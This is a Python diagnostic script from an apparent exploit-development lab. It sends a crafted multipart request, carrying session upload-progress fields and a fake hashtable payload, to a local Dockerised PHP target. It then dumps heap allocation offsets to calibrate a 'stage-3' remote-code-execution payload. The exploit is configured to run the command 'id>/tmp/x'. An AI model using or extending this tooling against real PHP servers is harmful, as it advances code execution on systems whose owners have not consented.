#!/usr/bin/env python3
"""diag_layout.py — dump the main-chunk allocation layout in the critical region during a real
stage-3 exploit request on stock, to see exactly what sits at PS(http_session_vars)=0x7a700 and
where the fake-HT (last field) lands. Foundation for calibrating a working stage-3 payload."""
import argparse, subprocess, sys, time
sys.path.insert(0, "/Users/bill/php2shell/lab")
sys.path.insert(0, "/Users/bill/php2shell/alvaro")
import exploit as alv          # noqa: E402
import exploit_stock           # noqa: F401,E402

CHUNK = 0x7ffffe000000
ap = argparse.ArgumentParser()
ap.add_argument("--url", default="http://localhost:18110/index.php")
ap.add_argument("--container", default="p2s")
a = ap.parse_args()
t = alv.Target(a.url, timeout=200)
ex = alv.Exploit(t, "id>/tmp/x", 0x5996e0, 0x7b47a0, htdata=0x7e0d8, huge_mb=140)

def clear_log(): subprocess.run(["docker","exec",a.container,"sh","-c",": > /tmp/alloc_all.log"])
def read_log(): return subprocess.run(["docker","exec",a.container,"cat","/tmp/alloc_all.log"],capture_output=True).stdout.decode("latin1").splitlines()

clear_log(); time.sleep(0.3)
ex.rotate(); ex._oom_arm_pads()   # arming (leaves PS(http_session_vars)=~0x7a700)
time.sleep(0.8)

# exploit request: tag the fake-HT field so we can find it; keep r-fields as-is
clear_log(); time.sleep(0.3)
ht = ex._fake_ht(0x7e0d8); live = ex._live_ref(0x7e0d8)
parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(8): parts.append({"name": "m%04d" % i, "data": b"M" * 100})
for i in range(80): parts.append({"name": (f"F{i:030d}")[:31], "data": b"z"})
for i in range(200): parts.append({"name": "r%04d" % i, "data": live})
parts.append({"name": "FAKEHT_MARKER", "data": ht})   # identifiable by name length/position (last)
t.post(alv.multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=40)
time.sleep(0.8)

lines = read_log()
# collect all main-chunk allocs with offsets+sizes, in the region of interest
region = []
for l in lines:
    p = l.split()
    if len(p) < 3 or p[0] not in ("M","R"): continue
    try: size, addr = int(p[1]), (int(p[2],16) if p[0]=="M" else int(p[3],16))
    except ValueError: continue
    off = addr - CHUNK
    if 0x79000 <= off < 0x81000:
        region.append((off, size))
region.sort()
print(f"[{a.container}] allocations in [0x79000,0x81000] during exploit request: {len(region)}")
# show the neighborhood of 0x7a700 (PS(http_session_vars)) and any large (fake-HT) allocs
print("--- around PS(http_session_vars)=0x7a700 ---")
for off,size in region:
    if abs(off-0x7a700) <= 0x100:
        print(f"   off=0x{off:x} size={size}")
print("--- large allocs (>=150B, candidate fake-HT carrier) ---")
for off,size in region:
    if size >= 150:
        print(f"   off=0x{off:x} size={size}")
